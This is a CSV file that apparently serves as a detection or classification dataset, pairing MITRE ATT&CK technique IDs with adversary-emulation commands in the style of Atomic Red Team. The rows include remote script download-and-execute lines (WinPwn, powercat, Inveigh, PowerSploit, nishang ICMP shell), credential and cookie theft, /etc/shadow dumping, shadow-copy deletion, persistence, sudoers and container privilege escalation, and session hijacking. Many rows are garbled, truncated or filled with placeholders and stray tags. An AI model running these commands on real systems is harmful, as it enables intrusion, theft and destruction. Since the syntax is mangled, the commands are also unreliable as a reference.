mitre_id,command
T1091,"$removabledrives=@()  $removabledrives  =  get-wmiobject  -class  win32_logicaldisk  -filter  ""drivetype=2""  |  select-object  -expandproperty  deviceid  foreach  ($drive  in  $removabledrives)  {  write-host  ""removable  drive  found:""  $drive  new-item  -path  $drive\t1091test1.txt  -itemtype  ""file""  -force  -value  ""t1091  test  1  has  created  this  file  to  simulate  malware  spread  to  removable  drives.""  }> /dev/null 2>&1 # id_54"
T1049,$syntaxlist  =  var_87838
T1123,sh var_42012
T1566,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""var_69706"""
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached# run_5827"
T1135,"import-module ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1"" invoke-sharefinder var_81821"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)# run_7480"
T1486,"set-content -path ""var_408`"""""
T1547,sudo #{exe_path} kextstat 2>/dev/null | grep softraid sudo kextunload /library/extensions/softraid.kext# run_2566
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_278"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1021,new-psdrive  -name  var_672
T1030,cd var_579
T1542,"echo  ""creating  %systemroot%\wpbbin.exe""  new-item  -itemtype  file  -path  ""$env:systemroot\system32\wpbbin.exe""# run_5790"
T1012,"reg  query  ""hklm\software\microsoft\windows  nt\currentversion\windows""  reg  query  hklm\software\microsoft\windows\currentversion\runservicesonce  reg  query  hkcu\software\microsoft\windows\currentversion\runservicesonce  reg  query  hklm\software\microsoft\windows\currentversion\runservices  reg  query  hkcu\software\microsoft\windows\currentversion\runservices  reg  query  ""hklm\software\microsoft\windows  nt\currentversion\winlogon\notify""  reg  query  ""hklm\software\microsoft\windows  nt\currentversion\winlogon\userinit""  reg  query  ""hkcu\software\microsoft\windows  nt\currentversion\winlogon\\shell""  reg  query  ""hklm\software\microsoft\windows  nt\currentversion\winlogon\\shell""  reg  query  hklm\software\microsoft\windows\currentversion\shellserviceobjectdelayload  reg  query  hklm\software\microsoft\windows\currentversion\runonce  reg  query  hklm\software\microsoft\windows\currentversion\runonceex  reg  query  hklm\software\microsoft\windows\currentversion\run  reg  query  hkcu\software\microsoft\windows\currentversion\run  reg  query  hkcu\software\microsoft\windows\currentversion\runonce  reg  query  hklm\software\microsoft\windows\currentversion\policies\explorer\run  reg  query  hkcu\software\microsoft\windows\currentversion\policies\explorer\run  reg  query  hklm\system\currentcontrolset\services  \s  |  findstr  imagepath  2>nul  |  findstr  \ri  "".*\.sys$""  reg  query  hklm\software\microsoft\windows\currentversion\run  reg  query  hklm\system\currentcontrolset\control\safeboot  reg  query  ""hklm\software\microsoft\active  setup\installed  components""  reg  query  ""hklm\software\microsoft\windows\currentversion\group  policy\scripts\startup""> /dev/null 2>&1 # id_82"
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }> /dev/null 2>&1 # id_77"
T1140,echo  var_17147  |  base64  -d  |  bash
T1526,"import-module  ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1""  $password  =  convertto-securestring  -string  ""var_55281""  -verbose"
T1571,echo  quit  |  telnet  var_280  exit  0
T1553,openssl genrsa -out var_52562 \etc\pki\ca-trust\source\anchors\ update-ca-trust
T1020,"$filename = ""var_603"
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""#{image_file}"" -out ""$home\result.ps1"" $scriptcontent = get-content ""$home\result.ps1"" -raw $base64pattern = ""(?<=^|[^a-za-z0-9+/])(?:[a-za-z0-9+/]{4})*(?:[a-za-z0-9+/]{2}(==)?|[a-za-z0-9+/]{3}=)?(?=$|[^a-za-z0-9+/])"" $base64strings = [regex]::matches($scriptcontent, $base64pattern) | foreach-object { $_.value } $base64strings | set-content ""$home\decoded.ps1"" $decodedcontent = get-content ""$home\decoded.ps1"" -raw $decodedtext = [system.text.encoding]::utf8.getstring([system.convert]::frombase64string($decodedcontent)) $textpattern = '^.+' $textmatches = [regex]::matches($decodedtext, $textpattern) | foreach-object { $_.value } $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"""
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f> /dev/null 2>&1 # id_80
T1553,certutil -addstore my var_544
T1201,cat /etc/pam.d/common-password# run_6551
T1530,aws --no-sign-request s3 cp --recursive s3:\\var_12316
T1539,"killall  'google  chrome'  sleep  1  open  -a  ""\applications\google  chrome.app\contents\macos\google  chrome""  --args  --remote-debugging-port=2521  --remote-allow-origins=http:\\localhost\  sleep  1  \tmp\whitechocolatemacademianut\chocolate  -d  cookies  -p  59267"
T1195,"kubectl run var_859 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1014,"echo var_239 | tee -a \etc\ld.so.preload \usr\local\bin\evil_script.py localhost -c 10 >\dev\null & pgrep -l evil_script.py || echo ""process hidden"""
T1580,"export aws_region=var_77153 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_299"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1490,vssadmin.exe delete shadows /all /quiet# run_6823
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_120 write-host ""end of federation configuration."""
T1572,nohup var_134 >\dev\null 2>&1 &
T1098,"import-module -name az.resources $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azaccount -credential $credential $user = get-azaduser | where-object {$_.displayname -eq ""#{user_principal_name}"" -or $_.userprincipalname -eq ""#{user_principal_name}"" } if ($user -eq $null) { write-warning ""user not found""; exit } $subscription = get-azsubscription | where-object {$_.name -eq ""#{subscription}""} if ($subscription -eq $null) { write-warning ""subscription not found""; exit } $role = get-azroledefinition | where-object {$_.name -eq ""#{role_name}""} if ($role -eq $null) { write-warning ""role not found""; exit } new-azroleassignment -objectid $user.id -roledefinitionid $role.id -scope /subscriptions/$subscription write-host ""user $($user.displayname) was added to $($role.name) role in subscriptions $($subscriptions.name)"""
T1518,powershell get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct powershell get-wmiobject -namespace root\securitycenter2 -class antivirusproduct# run_5181
T1564,"cmd /c ""#{nircmd_location}"" #{command_to_execute}"
T1548,"sudo sh -c ""echo defaults ""'!'""tty_tickets >> /etc/sudoers"" sudo visudo -c -f /etc/sudoers"
T1553,"mount-diskimage -imagepath ""var_626"""
T1136,kubectl  run  var_310'
T1059,out-athpowershellcommandlineparameter  -commandlineswitchtype  var_69160  -execute  -erroraction  stop
T1619,"try{$response = invoke-webrequest ""https:\\var_55081 -append"
T1134,"cd ""pathtoatomicsfolder\..\externalpayloads"" start-process .\badpotato.exe notepad.exe start-sleep -second 20 stop-process -name ""notepad"" -force -erroraction silentlycontinue stop-process -name ""badpotato"" -force -erroraction silentlycontinue# run_1815"
T1566,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""var_51608"""
T1020,"$sampledata = ""sample data for exfiltration test"" set-content -path ""var_46313"" -credential $creds"
T1070,truncate -s0 #{history_path}
T1592,"get-ciminstance  -query  ""select  *  from  win32_pnpentity  where  (pnpclass  =  'image'  or  pnpclass  =  'camera')""> /dev/null 2>&1 # id_81"
T1018,"cmd /c '#{netscan_path}' /hide /auto:""$env:temp\t1018netscanoutput.txt"" /range:'#{range_to_scan}'> /dev/null 2>&1 # id_61"
T1106,"c:\windows\microsoft.net\framework\v4.0.57912\csc.exe \out:""var_64752"" %tmp%\t1106.exe"
T1555,cat ~\library\keychains\login.keychain-db > var_22152
T1485,dd of=var_19477') iflag=count_bytes
T1543,"copy ""var_431"" %systemroot%\system32\ sc create w64time binpath= ""%systemroot%\system32\svchost.exe -k timeservice"" type= share start=auto sc config w64time displayname= ""windows 64 time"" sc description w64time ""maintain date and time synch on all clients and services in the network"" reg add ""hklm\software\microsoft\windows nt\currentversion\svchost"" \v timeservice \t reg_multi_sz \d ""w64time"" \f reg add ""hklm\system\currentcontrolset\services\w64time\parameters"" \v servicedll \t reg_expand_sz \d ""%systemroot%\system32\w64time.dll"" \f sc start w64time"
T1127,"copy ""var_4519 \t:library %temp%\libhello.js"
T1654,powershell  -c  {get-eventlog  'security'  |  where  {$_.message  -like  '*system*'}  |  export-csv  $env:temp\t1654_events.txt}> /dev/null 2>&1 # id_54
T1570,net use * 'var_926' '*:\'
T1037,sudo  cp  var_307  \tmp\t1037_005_daemon.plist  sudo  \library\startupitems\atomic.sh  start
T1550,"& ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" -accepteula \\var_232 \ticket:ticket.kirbi \ptt remove-item ""pathtoatomicsfolder\..\externalpayloads\ticket.kirbi"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" purge"
T1127,"var_593"""
T1490,wmic.exe shadowcopy delete> /dev/null 2>&1 # id_44
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 4> /dev/null 2>&1 # id_31"
T1114,"$secure_pwd = ""var_717"""
T1071,"curl -s -a ""httpbrowser\1.0"" -m3 var_895"
T1569,"""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" \\var_656 -accepteula ""%systemroot%\system32\calc.exe"""
T1221,"start ""var_29473"""
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh# run_6428
T1595,"import-module  ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1""  invoke-wordlistscan  -target  ""var_430"""
T1496,yes > \dev\null# run_9490
T1040,sudo var_599 -4 -p 6 -t 3
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_49082"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1547,"file=`find ~/library/preferences/byhost/com.apple.loginwindow.*.plist -type f | head -1` if [ -z ""${file}"" ] ; then echo ""no loginwindow plist file found"" && exit 1 ; fi echo save backup copy to /tmp/ cp ${file} /tmp/t1547007_loginwindow-backup.plist echo before plutil -p ${file} echo overwriting... #{exe_path} ${file} && echo after && plutil -p ${file}# run_1296"
T1489,sc.exe stop var_63915
T1040,sudo  var_124  -t  3
T1546,"bash -c 'trap ""nohup sh $pathtoatomicsfolder/t1546.005/src/echo-art-fish.sh"" exit'# run_6795"
T1040,sudo  var_442  -t  3
T1611,if [ ! -d var_954 2>&1
T1041,"$dnsserver  =  ""var_903"
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe""  --pipe  2# run_8473"
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive# run_9251
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 2# run_1061"
T1573,$server_ip  =  var_613
T1651,"import-module  ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1""  -force  $access_key  =  ""var_216""  set-awsauthentication  -accesskey  $access_key  -secretkey  $secret_key  -sessiontoken  $session_token  -awsprofile  $aws_profile  -awsregion  $region  invoke-terraform  -terraformcommand  init  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  apply  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")  invoke-ssmattack  -awsprofile  ""t1651-1""  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  destroy  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")"
T1539,"stop-process -name ""chrome"" -force -erroraction silentlycontinue ""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [cookies];"" | cmd \c var_18658"""
T1036,copy %systemroot%\system32\cscript.exe %appdata%\notepad.exe /y cmd.exe /c %appdata%\notepad.exe /b
T1140,"mkdir ""var_453"" -f:* . popd"
T1564,"mkdir /var/tmp/.hidden-directory echo ""t1564.001"" > /var/tmp/.hidden-directory/.hidden-file"
T1592,"get-ciminstance  -query  ""select  *  from  win32_pnpentity  where  (pnpclass  =  'image'  or  pnpclass  =  'camera')""# run_5153"
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_480"""
T1057,ps >> var_57231
T1580,"export aws_region=var_263 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1010,c:\windows\microsoft.net\framework\v4.0.28900\csc.exe -out:var_17637
T1005,"$startingdirectory = ""var_174"
T1120,iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1')  printercheck  -noninteractive  -consoleoutput# run_3541
T1037,"echo ""var_98629"" \f"
T1027,"start-process ""#{exe_binary}"" start-sleep -seconds 7 if (test-path ""c:\users\john\appdata\local\temp\hello.log"") { remove-item ""c:\users\john\appdata\local\temp\hello.log"" -force; write-host ""[+] hello.log removed."" }"
T1543,sc.exe  \\var_599
T1560,zip -r #{input_folder}/#{input_file}.zip #{input_folder} openssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc cat #{input_folder}/#{input_file}.enc | base64
T1053,at 13:20 \interactive cmd
T1547,"copy-item ""$pathtoatomicsfolder\t1547.001\src\vbsstartup.vbs"" ""$env:appdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" copy-item ""$pathtoatomicsfolder\t1547.001\src\vbsstartup.vbs"" ""c:\programdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" cscript.exe ""$env:appdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" cscript.exe ""c:\programdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"""
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }""> /dev/null 2>&1 # id_59"
T1529,"echo """" | ""var_11620'`; do vim-cmd vmsvc\power.off $i & done"""
T1574,"copy %windir%\system32\amsi.dll %appdata%\amsi.dll ren %appdata%\amsi.dll winappxrt.dll copy %appdata%\winappxrt.dll %windir%\system32\winappxrt.dll reg add ""hkey_current_user\environment"" /v appx_process /t reg_expand_sz /d ""1"" /f"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_116"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1072,"""%programfiles(x86)%\var_7355"""
T1562,reg add hkcu\software\classes\clsid\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\inprocserver32 /ve /t reg_sz /d c:\idontexist.dll /f
T1113,import -window root var_444
T1518,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') dotnet -consoleoutput -noninteractive> /dev/null 2>&1 # id_26
T1497,"if  [  ""$(sysctl  -n  hw.model  |  grep  -v  'mac')""  !=  """"  ];  then  echo  'virtualization  environment  detected';  fi;# run_5098"
T1036,"sc create win32times binpath= ""cmd \c start c:\t1036.004_nonexistingscript.ps1"" sc qc win32times"
T1611,"echo ""current user: var_670"" sudo -u docker_user sh -c ""sudo docker run -v \:\mnt --rm --name t1611_privesc -it alpine chroot \mnt id"""
T1548,"reg add ""hklm\software\microsoft\security center"" /v uacdisablenotify /t reg_dword /d 1 /f"
T1133,"$extlist = var_42840 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1033,set file=var_91516\user_info_%random%.tmp echo username: %username% > %file% echo user domain: %userdomain% >> %file% net users >> %file% query user >> %file%
T1557,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1""  -usebasicparsing)  invoke-inveigh  -consoleoutput  y  -nbns  y  -mdns  y  -https  y  -proxy  y> /dev/null 2>&1 # id_71"
T1106,"c:\windows\microsoft.net\framework\v4.0.3625\csc.exe \out:""var_63449"" %tmp%\t1106.exe"
T1202,# copy command to clipboard set-clipboard -value 'var_43437')
T1546,"bash -c 'trap ""nohup sh $pathtoatomicsfolder/t1546.005/src/echo-art-fish.sh"" exit'"
T1530,"$storage_account_objects = import-csv -path ""var_364"
T1134,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\get-system-techniques\master\tokenmanipulation\get-winlogontokensystem.ps1');get-winlogontokensystem> /dev/null 2>&1 # id_61
T1486,7z a -p var_464
T1078,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') obfuskittiedump -consoleoutput -noninteractive
T1027,"c:\windows\microsoft.net\framework64\v4.0.2646\csc.exe \out:var_75042"""
T1134,cmd \c 'var_492'
T1137,reg.exe add hkcu\software\microsoft\office\var_94746 \f
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')""# run_6442"
T1129,"var_664"""
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh> /dev/null 2>&1 # id_90
T1053,schtasks \create \sc once \tn spawn \tr var_953
T1095,iex  (new-object  system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\besimorhino\powercat\ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5\powercat.ps1')  powercat  -c  var_810
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached# run_5201"
T1105,scp #{local_file} #{username}@#{remote_host}:#{remote_path}
T1007,schtasks /query /fo list /v# run_5182
T1113,xwd -root -out var_70924
T1578,gcloud  compute  snapshots  create  var_693
T1003,sudo cat /etc/shadow > #{output_file} cat #{output_file}
T1133,"$extlist = var_275 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_74326"" net start sesshijack"
T1095,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/shells/invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress #{server_ip}
T1222,"reg add ""hklm\system\currentcontrolset\control\filesystem"" \v symlinkremotetolocalevaluation \t reg_dword \d ""1"" \f reg add ""hklm\system\currentcontrolset\control\filesystem"" \v symlinkremotetoremoteevaluation \t reg_dword \d ""1"" \f# run_4585"
T1530,aws --no-sign-request s3 cp --recursive s3:\\var_350
T1201,cat /etc/login.defs# run_1054
T1569,"""pathtoatomicsfolder\..\externalpayloads\remcom.exe""  \\var_390  cmd.exe"
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_788"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = get-content ""var_709"""
T1560,"mkdir -p #{test_folder} cd #{test_folder}; touch a b c d e f g zip --password ""#{encryption_password}"" #{test_folder}/#{test_file} ./* echo ""#{encryption_password}"" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip ls -l #{test_folder}"
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_479"" net start sesshijack"
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_592"" net start sesshijack"
T1491,"$url = ""var_639"
T1036,copy %systemroot%\system32\cmd.exe %systemroot%\temp\lsass.exe %systemroot%\temp\lsass.exe \b> /dev/null 2>&1 # id_80
T1069,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe""  -f  (objectcategory=group)  var_285"
T1037,sudo cp var_60243 \tmp\t1037_005_daemon.plist sudo \library\startupitems\atomic.sh start
T1197,bitsadmin.exe \create var_742
T1614,pathtoatomicsfolder\..\externalpayloads\languagekeyboardlayout.exe
T1140,encoded=$(echo 'var_588 | xxd -r -p
T1041,"$dnsserver = ""var_981"
T1021,"echo """" | ""var_449"" ""vim-cmd hostsvc\enable_ssh"""
T1124,net  time  \\var_55779  w32tm  \tz
T1033,"$tokenset  =  @{  u  =  [char[]]'abcdefghijklmnopqrstuvwxyz'  n  =  [char[]]'0123456789'  }  $upper  =  get-random  -count  5  -inputobject  $tokenset.u  $number  =  get-random  -count  5  -inputobject  $tokenset.n  $stringset  =  $upper  +  $number  $rad  =  (get-random  -count  5  -inputobject  $stringset)  -join  ''  $file  =  ""rad""  +  $rad  +  "".tmp""  whoami.exe  \all  >>  var_83447\$file"
T1652,kextfind> /dev/null 2>&1 # id_98
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_50114 write-host ""end of federation configuration."""
T1654,wevtutil  enum-logs> /dev/null 2>&1 # id_84
T1134,"get-ciminstance  -classname  win32_process  -property  name,  commandline,  processid  -filter  ""name  =  'svchost.exe'  and  commandline  like  '%'""  |  select-object  -first  1  |  start-athprocessunderspecificparent  -filepath  var_22845'"
T1003,"""#{dumpert_exe}"""
T1496,yes > \dev\null> /dev/null 2>&1 # id_18
T1220,"wmic  var_291"""
T1490,vssadmin.exe delete shadows /all /quiet> /dev/null 2>&1 # id_16
T1558,"klist purge cmd.exe \c ""var_42396"""
T1201,pwpolicy getaccountpolicies# run_5644
T1547,"reg add ""hkey_classes_root\directory\background\shell\size modify\command"" \ve \t reg_sz \d ""%systemroot%\system32\calc.exe"" \f"
T1112,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\internet settings\zonemap\protocoldefaults"" /v http /t reg_dword /d 0 /f reg add ""hkey_current_user\software\microsoft\windows\currentversion\internet settings\zonemap\protocoldefaults"" /v https /t reg_dword /d 0 /f"
T1135,dir \\var_34095\ipc$
T1619,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base var_242"""
T1619,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base var_49796"""
T1482,[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  'https:\\raw.githubusercontent.com\powershellmafia\powersploit\f94a5d298a1b4c5dfb1f30a246d9c73d13b22888\recon\powerview.ps1'  -usebasicparsing);  get-domaintrust  -verbose# run_4110
T1222,takeown.exe  \f  var_601  \r
T1613,podman build -t t1613 $pathtoatomicsfolder\t1613\src\ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)> /dev/null 2>&1 # id_70
T1006,"$buffer  =  new-object  byte[]  11  $handle  =  new-object  io.filestream  ""\\.\var_668"",  'open',  'read',  'readwrite'  $handle.read($buffer,  0,  $buffer.length)  $handle.close()  format-hex  -inputobject  $buffer"
T1113,import -window root var_1950
T1613,podman build -t t1613 $pathtoatomicsfolder/t1613/src/ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)# run_1161
T1114,"$ss = convertto-securestring ""var_616"
T1552,reg query hklm /f password /t reg_sz /s reg query hkcu /f password /t reg_sz /s# run_8549
T1567,"$apikey = ""var_207 $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"""
T1572,nohup code tunnel --accept-server-license-terms var_127 >\dev\null 2>&1 &
T1053,schtasks  \create  \sc  once  \tn  spawn  \tr  var_52240
T1048,"var_829"" https:\\file.io\"
